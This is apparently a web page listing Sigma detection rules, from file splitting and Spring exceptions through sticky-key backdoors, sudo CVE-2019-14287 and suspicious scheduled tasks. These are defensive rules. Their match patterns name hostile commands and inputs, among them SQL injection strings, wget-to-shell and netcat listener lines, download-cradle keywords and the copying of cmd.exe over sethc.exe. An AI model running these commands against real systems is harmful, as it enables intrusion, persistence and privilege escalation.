<li><a href="#">title:'Split A File Into Pieces' id: 7f2bb9d5-6395-4de5-969c-70c11fbe6b12 status: test description: 'Detection use of the command "split" to split files into parts and possible transfer.' author: 'Igor Fits, Mikhail Larin, oscd.community' references: - date: 2020/10/15 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection: Image|endswith: '/split' condition: selection falsepositives: - Legitimate administrative activity level: low tags: - attack.exfiltration - attack.t1030 
<li><a href="#">title:Spring Framework Exceptions id: ae48ab93-45f7-4051-9dfe-5d30a3f78e33 status: stable description: Detects suspicious Spring framework exceptions that could indicate exploitation attempts author: Thomas Patzke date: 2017/08/06 modified: 2020/09/01 references: - logsource: category: application product: spring detection: keywords: - AccessDeniedException - CsrfException - InvalidCsrfTokenException - MissingCsrfTokenException - CookieTheftException - InvalidCookieException - RequestRejectedException condition: keywords falsepositives: - Application bugs level: medium tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:SQL Client Tools PowerShell Session Detection id: a746c9b8-a2fb-4ee5-a428-92bee9e99060 status: test description: This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio. Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs. author: 'Agro (@agro_sev) oscd.communitly' references: - - date: 2020/10/13 modified: 2022/02/25 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\sqltoolsps.exe' selection_2: ParentImage|endswith: '\sqltoolsps.exe' selection_3: OriginalFileName: '\sqltoolsps.exe' filter: ParentImage|endswith: '\smss.exe' condition: 1 of selection_* and not filter falsepositives: - Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe spawned by smss.exe is a legitimate action. level: medium tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1127 
<li><a href="#">title:SQL Injection Strings id: 5513deaf-f49a-46c2-a6c8-3f111b5cb453 status: test description: Detects SQL Injection attempts via GET requests in access logs author: Saw Win Naung, Nasreddine Bencherchali date: 2020/02/22 modified: 2022/06/27 references: - - - - logsource: category: webserver detection: select_method: cs-method: 'GET' keywords: - '=select' - 'UNION SELECT' - 'UNION%20SELECT' - 'UNION ALL SELECT' - 'UNION%20ALL%20SELECT' - 'CONCAT(0x' - 'order by ' - 'order%20by%20' - 'information_schema.tables' - 'group_concat(' - 'table_schema' - 'select%28sleep%2810%29' - '@@version' - "'1'='1" - '%271%27%3D%271' - 'SELECTCHAR(' - 'select * ' - 'select%20*%20' - 'or 1=1#' - 'or%201=1#' filter: sc-status: 404 filter_fps: - '=select2' condition: select_method and keywords and not 1 of filter* fields: - client_ip - vhost - url - response falsepositives: - Java scripts and CSS Files - User searches in search boxes of the respective website - Internal vulnerability scanners can cause some serious FPs when used, if you experience a lot of FPs due to this think of adding more filters such as "User Agent" strings and more response codes level: high 
<li><a href="#">title:SQLite Firefox Cookie DB Access id: 4833155a-4053-4c9c-a997-777fcea0baa7 status: experimental description: Detect use of sqlite binary to query the Firefox cookies.sqlite database and steal the cookie data contained within it author: frack113 date: 2022/04/08 references: - logsource: category: process_creation product: windows detection: selection_sql: - Product: SQLite - Image|endswith: '\sqlite.exe' selection_firefox: CommandLine|contains: 'cookies.sqlite' condition: all of selection_* falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1539 
<li><a href="#">title:SquiblyTwo id: 8d63dadf-b91b-4187-87b6-34a1114577ea status: test description: Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for imphash author: Markus Neis / Florian Roth references: - - date: 2019/01/16 modified: 2022/03/21 logsource: category: process_creation product: windows detection: selection_one: Image|endswith: '\wmic.exe' CommandLine|contains|all: - wmic - format - http selection_wmic_imphash: - Imphash: - 1B1A3F43BF37B5BFE60751F2EE2F326E - 37777A96245A3C74EB217308F3546F4C - 9D87C9D67CE724033C0B40CC4CA1B206 - Hashes|contains: # Sysmon field hashes contains all types - IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E - IMPHASH=37777A96245A3C74EB217308F3546F4C - IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206 selection_flags: CommandLine|contains|all: - 'format:' - 'http' condition: selection_one or (selection_wmic_imphash and selection_flags) falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1047 - attack.t1220 - attack.execution - attack.t1059.005 - attack.t1059.007 
<li><a href="#">title:Squirrel Lolbin id: fa4b21c9-0057-4493-b289-2556416ae4d7 status: experimental description: Detects Possible Squirrel Packages Manager as Lolbin references: - - tags: - attack.execution - attack.defense_evasion - attack.t1218 author: Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community date: 2019/11/12 modified: 2022/01/12 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\update.exe' # Check if folder Name matches executed binary \\(?P<first>[^\\]*)\\Update.*Start.{2}(?P<second>\1)\.exe (example: ) CommandLine|contains: '.exe' selection2: CommandLine|contains: - '--processStart' - '--processStartAndWait' - '--createShortcut' filter1: CommandLine|contains|all: - 'C:\Users\' - '\AppData\Local\Discord\Update.exe' - ' --processStart Discord.exe' condition: all of selection* and not 1 of filter* falsepositives: - 1Clipboard - Beaker Browser - Caret - Collectie - Discord - Figma - Flow - Ghost - GitHub Desktop - GitKraken - Hyper - Insomnia - JIBO - Kap - Kitematic - Now Desktop - Postman - PostmanCanary - Rambox - Simplenote - Skype - Slack - SourceTree - Stride - Svgsus - WebTorrent - WhatsApp - WordPress.com - Atom - Gitkraken - Slack - Teams level: medium 
<li><a href="#">title:SSHD Error Message CVE-2018-15473 id: 4c9d903d-4939-4094-ade0-3cb748f4d7da status: test description: Detects exploitation attempt using public exploit code for CVE-2018-15473 author: Florian Roth references: - date: 2017/08/24 modified: 2021/11/27 logsource: product: linux service: sshd detection: keywords: - 'error: buffer_get_ret: trying to get more bytes 1907 than in buffer 308 [preauth]' condition: keywords falsepositives: - Unknown level: medium tags: - attack.reconnaissance - attack.t1589 
<li><a href="#">title:Startup Folder File Write id: 2aa0a6b4-a865-495b-ab51-c28249537b75 status: test description: A General detection for files being created in the Windows startup directory. This could be an indicator of persistence. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - date: 2020/05/02 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: 'ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp' condition: selection falsepositives: - Unknown level: low tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Startup Items id: dfe8b941-4e54-4242-b674-6b613d521962 status: test description: Detects creation of startup item plist files that automatically get executed at boot initialization to establish persistence. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/14 modified: 2021/11/27 logsource: category: file_event product: macos detection: selection_1: TargetFilename|contains: '/Library/StartupItems/' selection_2: TargetFilename|endswith: '.plist' condition: selection_1 and selection_2 falsepositives: - Legitimate administration activities level: low tags: - attack.persistence - attack.privilege_escalation - attack.t1037.005 
<li><a href="#">title:Stealthy VSTO Persistence id: 9d15044a-7cfe-4d23-8085-6ebc11df7685 status: experimental description: Detects persistence via Visual Studio Tools for Office (VSTO) add-ins in Office applications. references: - - author: Bhabesh Raj date: 2021/01/10 modified: 2022/06/10 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: - '\Software\Microsoft\Office\Outlook\Addins\' - '\Software\Microsoft\Office\Word\Addins\' - '\Software\Microsoft\Office\Excel\Addins\' - '\Software\Microsoft\Office\Powerpoint\Addins\' - '\Software\Microsoft\VSTO\Security\Inclusion\' filter_image: Image|endswith: - '\msiexec.exe' - '\regsvr32.exe' # e.g. default Evernote installation # triggered by a default Office 2019 installation filter_office: Image|endswith: - '\winword.exe' - '\integrator.exe' - '\OfficeClickToRun.exe' filter_avg: Image: 'C:\Program Files\AVG\Antivirus\RegSvr.exe' TargetObject|contains: '\Microsoft\Office\Outlook\Addins\Antivirus.AsOutExt\' condition: selection and not 1 of filter_* falsepositives: - Legitimate Addin Installation level: medium tags: - attack.t1137.006 - attack.persistence 
<li><a href="#">title:Steganography Extract Files with Steghide id: a5a827d9-1bbe-4952-9293-c59d897eb41b description: Detects extraction of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information. author: 'Pawel Mazur' status: experimental date: 2021/09/11 references: - - tags: - attack.defense_evasion - attack.t1027.003 falsepositives: - Unknown level: low logsource: product: linux service: auditd detection: selection: type: EXECVE a0: steghide a1: extract a2: '-sf' a3|endswith: - '.jpg' - '.png' condition: selection 
<li><a href="#">title:Steganography Hide Files with Steghide id: ce446a9e-30b9-4483-8e38-d2c9ad0a2280 description: Detects embeding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information. author: 'Pawel Mazur' status: experimental date: 2021/09/11 references: - - tags: - attack.defense_evasion - attack.t1027.003 falsepositives: - Unknown level: low logsource: product: linux service: auditd detection: selection: type: EXECVE a0: steghide a1: embed a2: - '-cf' - '-ef' a4: - '-cf' - '-ef' condition: selection 
<li><a href="#">title:Steganography Hide Zip Information in Picture File id: 45810b50-7edc-42ca-813b-bdac02fb946b description: Detects appending of zip file to image author: 'Pawel Mazur' status: experimental date: 2021/09/09 references: - - tags: - attack.defense_evasion - attack.t1027.003 falsepositives: - Unknown level: low logsource: product: linux service: auditd detection: commands: type: EXECVE a0: cat a1: a1|endswith: - '.jpg' - '.png' a2: a2|endswith: '.zip' condition: commands and a1 and a2 
<li><a href="#">title:Steganography Unzip Hidden Information From Picture File id: edd595d7-7895-4fa7-acb3-85a18a8772ca description: Detects extracting of zip file from image file author: 'Pawel Mazur' status: experimental date: 2021/09/09 references: - - tags: - attack.defense_evasion - attack.t1027.003 falsepositives: - Unknown level: low logsource: product: linux service: auditd detection: commands: type: EXECVE a0: unzip a1: a1|endswith: - '.jpg' - '.png' condition: commands and a1 
<li><a href="#">title:Sticky Key Like Backdoor Usage id: 2fdefcb3-dbda-401e-ae23-f0db027628bc related: - id: baca5663-583c-45f9-b5dc-ea96a22ce542 type: derived description: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen status: test references: - tags: - attack.privilege_escalation - attack.persistence - attack.t1546.008 - car.2014-11-003 - car.2014-11-008 author: Florian Roth, @twjackomo, Jonhnathan Ribeiro, oscd.community date: 2018/03/15 modified: 2021/09/12 logsource: category: process_creation product: windows detection: selection_process: ParentImage|endswith: '\winlogon.exe' Image|endswith: '\cmd.exe' CommandLine|contains: - 'sethc.exe' - 'utilman.exe' - 'osk.exe' - 'Magnify.exe' - 'Narrator.exe' - 'DisplaySwitch.exe' condition: selection_process falsepositives: - Unlikely level: critical 
<li><a href="#">title:Sticky Key Like Backdoor Usage id: baca5663-583c-45f9-b5dc-ea96a22ce542 description: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen status: experimental references: - author: Florian Roth, @twjackomo, Jonhnathan Ribeiro, oscd.community date: 2018/03/15 modified: 2021/09/12 logsource: category: registry_event product: windows detection: selection_registry: TargetObject|endswith: - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger' - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\Debugger' - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\Debugger' - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe\Debugger' - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe\Debugger' - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe\Debugger' condition: selection_registry falsepositives: - Unlikely level: critical tags: - attack.privilege_escalation - attack.persistence - attack.t1546.008 - car.2014-11-003 - car.2014-11-008 
<li><a href="#">title:Sticky-Key Backdoor Copy Cmd.exe id: 1070db9a-3e5d-412e-8e7b-7183b616e1b3 description: By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system. When the sticky keys are "activated" the privilleged shell is launched. references: - - status: experimental date: 2020/02/18 modified: 2022/04/19 author: Sreeman tags: - attack.t1546.008 - attack.privilege_escalation logsource: product: windows category: process_creation detection: selection: CommandLine: 'copy /y C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe' condition: selection fields: - CommandLine - ParentProcess falsepositives: - Unknown level: medium 
<li><a href="#">title:StoneDrill Service Install id: 9e987c6c-4c1e-40d8-bd85-dd26fba8fdd6 status: test description: This method detects a service install of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky author: Florian Roth references: - date: 2017/03/07 modified: 2021/11/30 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ServiceName: NtsSrv ImagePath|endswith: ' LocalService' condition: selection falsepositives: - Unlikely level: high tags: - attack.persistence - attack.g0064 - attack.t1543.003 
<li><a href="#">title:Stop Or Remove Antivirus Service id: 6783aa9e-0dc3-49d4-a94a-8b39c5fd700b status: experimental author: frack113 date: 2021/07/07 modified: 2021/12/02 description: Adversaries may disable security tools to avoid possible detection of their tools and activities by stopping antivirus service references: - tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection_action: CommandLine|contains: - 'Stop-Service ' - 'Remove-Service ' selection_product: CommandLine|contains: - ' McAfeeDLPAgentService' - ' Trend Micro Deep Security Manager' - ' TMBMServer' # Feel free to add more service name condition: all of selection* fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Stop Windows Service id: eb87818d-db5d-49cc-a987-d5da331fbd90 description: Detects a windows service to be stopped status: experimental author: Jakob Weinzettl, oscd.community date: 2019/10/23 modified: 2022/06/20 tags: - attack.impact - attack.t1489 logsource: category: process_creation product: windows detection: selection_img: - OriginalFileName: - 'sc.exe' - 'net.exe' - 'net1.exe' - Image|endswith: - '\sc.exe' - '\net.exe' - '\net1.exe' selection_cli: CommandLine|contains: 'stop' filter: CommandLine: 'sc stop KSCWebConsoleMessageQueue' # kaspersky Security Center Web Console double space between sc and stop User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: all of selection_* and not filter fields: - ComputerName - User - CommandLine falsepositives: - Administrator shutting down the service due to upgrade or removal purposes level: low 
<li><a href="#">title:Successful Exchange ProxyShell Attack id: 992be1eb-e5da-437e-9a54-6d13b57bb4d8 status: experimental description: Detects URP patterns and status codes that indicate a successful ProxyShell exploitation attack against Exchange servers references: - - - author: Florian Roth, Rich Warren date: 2021/08/09 tags: - attack.initial_access logsource: category: webserver detection: selection_auto: c-uri|contains: '/autodiscover.json' selection_uri: c-uri|contains: - '/powershell' - '/mapi/nspi' - '/EWS' - 'X-Rps-CAT' selection_success: sc-status: - 200 - 301 condition: selection_auto and selection_uri and selection_success falsepositives: - Unknown level: critical 
<li><a href="#">title:Successful IIS Shortname Fuzzing Scan id: 7cb02516-6d95-4ffc-8eee-162075e111ac status: experimental author: frack113 description: When IIS uses an old .Net Framework it's possible to enumeration folder with the symbol ~. references: - - - date: 2021/10/06 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: c-uri|contains: '~1' c-uri|endswith: 'a.aspx' cs-method: - GET - OPTIONS #only succes sc-status: - 200 - 301 condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Successful Overpass the Hash Attempt id: 192a0330-c20b-4356-90b6-7b7049ae0b87 status: test description: Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module. author: Roberto Rodriguez (source), Dominik Schaudel (rule) references: - date: 2018/02/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 9 LogonProcessName: seclogo AuthenticationPackageName: Negotiate condition: selection falsepositives: - Runas command-line tool using /netonly parameter level: high tags: - attack.lateral_movement - attack.s0002 - attack.t1550.002 
<li><a href="#">title:Sudo Privilege Escalation CVE-2019-14287 id: 7fcc54cb-f27d-4684-84b7-436af096f858 related: - id: f74107df-b6c6-4e80-bf00-4170b658162b type: derived status: experimental description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287 author: Florian Roth date: 2019/10/15 modified: 2021/11/11 references: - - - logsource: product: linux service: sudo tags: - attack.privilege_escalation - attack.t1068 - attack.t1548.003 - cve.2019.14287 detection: selection_user: USER: - '#-*' - '#*4294967295' condition: selection_user falsepositives: - Unlikely level: critical 
<li><a href="#">title:Sudo Privilege Escalation CVE-2019-14287 id: f74107df-b6c6-4e80-bf00-4170b658162b status: experimental description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287 author: Florian Roth date: 2019/10/15 modified: 2021/09/14 references: - - - logsource: product: linux tags: - attack.privilege_escalation - attack.t1068 - attack.t1548.003 - cve.2019.14287 detection: selection_keywords: - '* -u#*' condition: selection_keywords falsepositives: - Unlikely level: high 
<li><a href="#">title:Suspect Svchost Activity id: 16c37b52-b141-42a5-a3ea-bbe098444397 status: experimental description: It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space. references: - author: David Burkett date: 2019/12/28 modified: 2022/06/27 tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: 'svchost.exe' Image|endswith: '\svchost.exe' filter: - ParentImage|endswith: - '\rpcnet.exe' - '\rpcnetp.exe' - CommandLine: null # no CommandLine value available condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Rpcnet.exe / rpcnetp.exe which is a lojack style software. level: high 
<li><a href="#">title:Suspect Svchost Memory Asccess id: 166e9c50-8cd9-44af-815d-d1f0c0e90dde status: experimental description: Detects suspect access to svchost process memory such as that used by Invoke-Phantom to kill the winRM windows event logging service. author: Tim Burrell date: 2020/01/02 modified: 2021/10/21 references: - - tags: - attack.defense_evasion - attack.t1562.002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\WINDOWS\System32\svchost.exe' GrantedAccess: '0x1F3FFF' CallTrace|contains: 'UNKNOWN' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious 7zip Subprocess id: 9a4ccd1a-3526-4d99-b980-9f9c5d3a6ee3 status: experimental description: 7-Zip through 21.07 on Windows allows privilege escalation (CVE-2022-29072) and command execution when a file with the .7z extension is dragged to the Help>Contents area. This is caused by misconfiguration of 7z.dll and a heap overflow. The command runs in a child process under the 7zFM.exe process. references: - - author: frack113 date: 2022/04/17 modified: 2022/04/19 tags: - cve.2022.29072 logsource: product: windows category: process_creation detection: selection: Image|endswith: '\cmd.exe' ParentImage|endswith: '\7zFM.exe' filter_bat: CommandLine|contains: ' /c ' filter_null: CommandLine: null condition: selection and not 1 of filter_* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Access to Sensitive File Extensions - Zeek id: 286b47ed-f6fe-40b3-b3a8-35129acd43bc status: test description: Detects known sensitive file extensions via Zeek author: 'Samir Bousseaden, @neu5ron' references: - date: 2020/04/02 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection: name|endswith: - '.pst' - '.ost' - '.msg' - '.nst' - '.oab' - '.edb' - '.nsf' - '.bak' - '.dmp' - '.kirbi' - '\groups.xml' - '.rdp' condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName - RelativeTargetName falsepositives: - Help Desk operator doing backup or re-imaging end user machine or backup software - Users working with these data types or exchanging message files level: medium tags: - attack.collection 
<li><a href="#">title:Suspicious Access to Sensitive File Extensions id: 91c945bc-2ad1-4799-a591-4d00198a1215 description: Detects known sensitive file extensions accessed on a network share status: experimental author: Samir Bousseaden date: 2019/04/03 modified: 2021/08/09 tags: - attack.collection - attack.t1039 logsource: product: windows service: security detection: selection: EventID: 5145 RelativeTargetName|endswith: - '.pst' - '.ost' - '.msg' - '.nst' - '.oab' - '.edb' - '.nsf' - '.bak' - '.dmp' - '.kirbi' - '\groups.xml' - '.rdp' condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName - RelativeTargetName falsepositives: - Help Desk operator doing backup or re-imaging end user machine or backup software - Users working with these data types or exchanging message files level: medium 
<li><a href="#">title:Suspicious Activity in Shell Commands id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695 status: test description: Detects suspicious shell commands used in various exploit codes (see references) author: Florian Roth references: - - - - date: 2017/08/21 modified: 2021/11/27 logsource: product: linux detection: keywords: # Generic suspicious commands - 'wget * - http* | perl' - 'wget * - http* | sh' - 'wget * - http* | bash' - 'python -m SimpleHTTPServer' - '-m http.server' # Python 3 - 'import pty; pty.spawn*' - 'socat exec:*' - 'socat -O /tmp/*' - 'socat tcp-connect*' - '*echo binary >>*' # Malware - '*wget *; chmod +x*' - '*wget *; chmod 777 *' - '*cd /tmp || cd /var/run || cd /mnt*' # Apache Struts in-the-wild exploit codes - '*stop;service iptables stop;*' - '*stop;SuSEfirewall2 stop;*' - 'chmod 777 2020*' - '*>>/etc/rc.local' # Metasploit framework exploit codes - '*base64 -d /tmp/*' - '* | base64 -d *' - '*/chmod u+s *' - '*chmod +s /tmp/*' - '*chmod u+s /tmp/*' - '* /tmp/haxhax*' - '* /tmp/ns_sploit*' - 'nc -l -p *' - 'cp /bin/ksh *' - 'cp /bin/sh *' - '* /tmp/*.b64 *' - '*/tmp/ysocereal.jar*' - '*/tmp/x *' - '*; chmod +x /tmp/*' - '*;chmod +x /tmp/*' condition: keywords falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.004 
<li><a href="#">title:Suspicious Add Scheduled Command Pattern id: f2c64357-b1d2-41b7-849f-34d2682c0fad description: Detects suspicious scheduled task creations with commands that are uncommon status: experimental references: - tags: - attack.execution - attack.t1053.005 author: Florian Roth date: 2022/02/23 modified: 2022/06/02 logsource: product: windows category: process_creation detection: selection_schtasks: Image|endswith: '\schtasks.exe' CommandLine|contains: '/Create ' selection_pattern1: CommandLine|contains: - '/sc minute ' - '/ru system ' selection_pattern2: CommandLine|contains: - 'cmd.exe /c ' - 'cmd /c' selection_rare: CommandLine|contains: - ' bypass ' - '.DownloadString' - '.DownloadFile' - 'FromBase64String' - ' -w hidden ' - ' IEX' - ' -enc ' - ' -decode ' - '/c start /min ' # - ' curl ' # selection_anomaly: - CommandLine|contains|all: - '/xml C:\Users\' - '\AppData\Local\' - CommandLine|contains|all: - 'wscript.exe' - '\AppData\' condition: selection_schtasks and ( all of selection_pattern* or selection_rare or selection_anomaly ) falsepositives: - Software installers that run from temporary folders and also install scheduled tasks level: high 
<li><a href="#">title:Suspicious Add Scheduled Task From User AppData Temp id: 43f487f0-755f-4c2a-bce7-d6d2eec2fcf8 description: schtasks.exe create task from user AppData\Local\Temp status: experimental references: - malware analyse tags: - attack.execution - attack.t1053.005 author: frack113 date: 2021/11/03 modified: 2022/06/02 logsource: product: windows category: process_creation detection: schtasks: Image|endswith: '\schtasks.exe' option: CommandLine|contains|all: - '/Create ' - '\AppData\Local\Temp' filter_klite_codec: CommandLine|contains|all: - '/Create /TN "klcp_update" /XML ' - '\klcp_update_task.xml' condition: schtasks and option and not 1 of filter_* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Add Scheduled Task Parent id: 9494479d-d994-40bf-a8b1-eea890237021 description: Detects suspicious scheduled task creations from a parent stored in a temporary folder status: experimental references: - tags: - attack.execution - attack.t1053.005 author: Florian Roth date: 2022/02/23 modified: 2022/06/02 logsource: product: windows category: process_creation detection: selection: Image|endswith: '\schtasks.exe' CommandLine|contains: '/Create ' ParentImage|contains: - '\AppData\Local\' - '\AppData\Roaming\' - '\Temporary Internet' - '\Users\Public\' filter: CommandLine|contains: - 'update_task.xml' - 'unattended.ini' condition: selection and not 1 of filter* falsepositives: - Software installers that run from temporary folders and also install scheduled tasks level: medium 
<li><a href="#">title:Suspicious Add User to Remote Desktop Users Group id: ffa28e60-bdb1-46e0-9f82-05f7a61cc06e status: experimental description: Detects suspicious command line in which a user gets added to the local Remote Desktop Users group author: Florian Roth date: 2021/12/06 references: - tags: - attack.persistence - attack.t1133 - attack.t1136.001 - attack.lateral_movement - attack.t1021.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'net ' - 'localgroup' - 'Remote Desktop Users' - '/add' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Administrative activity level: high 
<li><a href="#">title:Suspicious AdFind Enumerate id: 455b9d50-15a1-4b99-853f-8d37655a4c1b status: experimental description: Detects the execution of a AdFind for enumeration references: - - author: frack113 date: 2021/12/13 logsource: product: windows category: process_creation detection: selection: Image|endswith: '\adfind.exe' test_5: #Listing password policy CommandLine|contains: - lockoutduration - lockoutthreshold - lockoutobservationwindow - maxpwdage - minpwdage - minpwdlength - pwdhistorylength - pwdproperties test_6: #Enumerate Active Directory Admins CommandLine|contains: '-sc admincountdmp' test_8: #Enumerate Active Directory Exchange AD Objects CommandLine|contains: '-sc exchaddresses' condition: selection and 1 of test_* falsepositives: - Administrative activity level: medium tags: - attack.discovery - attack.t1087.002 
<li><a href="#">title:Suspicious AdFind Execution id: 75df3b17-8bcc-4565-b89b-c9898acef911 status: experimental description: Detects the execution of a AdFind for Active Directory enumeration references: - - - author: FPT.EagleEye Team, omkar72, oscd.community date: 2020/09/26 modified: 2021/05/12 tags: - attack.discovery - attack.t1018 - attack.t1087.002 - attack.t1482 - attack.t1069.002 logsource: product: windows category: process_creation detection: selection: CommandLine|contains: - 'objectcategory' - 'trustdmp' - 'dcmodes' - 'dclist' - 'computers_pwdnotreqd' Image|endswith: '\adfind.exe' condition: selection falsepositives: - Administrative activity level: medium 
<li><a href="#">title:Suspicious ADSI-Cache Usage By Unknown Tool id: 75bf09fa-1dd7-4d18-9af9-dd9e492562eb status: test description: Detects the usage of ADSI (LDAP) operations by tools. This may also detect tools like LDAPFragger. author: xknow @xknow_infosec references: - - - date: 2019/03/24 modified: 2022/04/21 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: '\Local\Microsoft\Windows\SchCache\' TargetFilename|endswith: '.sch' filter_eq: Image: - 'C:\windows\system32\svchost.exe' - 'C:\windows\system32\dllhost.exe' - 'C:\windows\system32\mmc.exe' - 'C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe' - 'C:\Windows\CCM\CcmExec.exe' - 'C:\Program Files\Cylance\Desktop\CylanceSvc.exe' - 'C:\Windows\System32\wbem\WmiPrvSE.exe' filter_begins: Image|startswith: 'C:\Windows\ccmsetup\autoupgrade\ccmsetup' # C:\Windows\ccmsetup\autoupgrade\ccmsetup.TMC00002.40.exe filter_domain_controller: Image: - 'C:\Windows\system32\efsui.exe' - 'C:\Windows\system32\dsac.exe' condition: selection and not 1 of filter* falsepositives: - Other legimate tools, which do ADSI (LDAP) operations, e.g. any remoting activity by MMC, Powershell, Windows etc. level: high tags: - attack.t1001.003 - attack.command_and_control 
<li><a href="#">title:Suspicious AdvancedRun Execution id: d2b749ee-4225-417e-b20e-a8d2193cbb84 status: experimental description: Detects the execution of AdvancedRun utitlity references: - - - - author: Florian Roth date: 2022/01/20 modified: 2022/05/13 logsource: product: windows category: process_creation detection: selection: - OriginalFileName: 'AdvancedRun.exe' - CommandLine|contains|all: - ' /EXEFilename ' - ' /Run' - CommandLine|contains|all: - ' /WindowState 0' - ' /RunAs ' - ' /CommandLine ' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious AdvancedRun Runas Priv User id: fa00b701-44c6-4679-994d-5a18afa8a707 status: experimental description: Detects the execution of AdvancedRun utitlity in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts references: - - - - author: Florian Roth date: 2022/01/20 modified: 2022/05/05 logsource: product: windows category: process_creation detection: selection: CommandLine|contains: - '/EXEFilename' - '/CommandLine' selection_runas: - CommandLine|contains: - ' /RunAs 8 ' - ' /RunAs 4 ' - ' /RunAs 10 ' - ' /RunAs 11 ' - CommandLine|endswith: - '/RunAs 8' - '/RunAs 4' - '/RunAs 10' - '/RunAs 11' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious aspnet_compiler.exe Execution id: a01b8329-5953-4f73-ae2d-aa01e1f35f00 status: experimental description: Execute C# code with the Build Provider and proper folder structure in place. references: - tags: - attack.defense_evasion - attack.t1127 author: frack113 date: 2021/11/24 logsource: category: process_creation product: windows detection: selection: Image|contains|all: - C:\Windows\Microsoft.NET\Framework - aspnet_compiler.exe condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Atbroker Execution id: f24bcaea-0cd1-11eb-adc1-0242ac120002 description: Atbroker executing non-deafualt Assistive Technology applications references: - - status: experimental author: Mateusz Wydra, oscd.community date: 2020/10/12 modified: 2021/08/14 tags: - attack.defense_evasion - attack.t1218 logsource: category: process_creation product: windows detection: selection: Image|endswith: 'AtBroker.exe' CommandLine|contains: 'start' filter: CommandLine|contains: - animations - audiodescription - caretbrowsing - caretwidth - colorfiltering - cursorscheme - filterkeys - focusborderheight - focusborderwidth - highcontrast - keyboardcues - keyboardpref - magnifierpane - messageduration - minimumhitradius - mousekeys - Narrator - osk - overlappedcontent - showsounds - soundsentry - stickykeys - togglekeys - windowarranging - windowtracking - windowtrackingtimeout - windowtrackingzorder condition: selection and not filter falsepositives: - Legitimate, non-default assistive technology applications execution level: high 
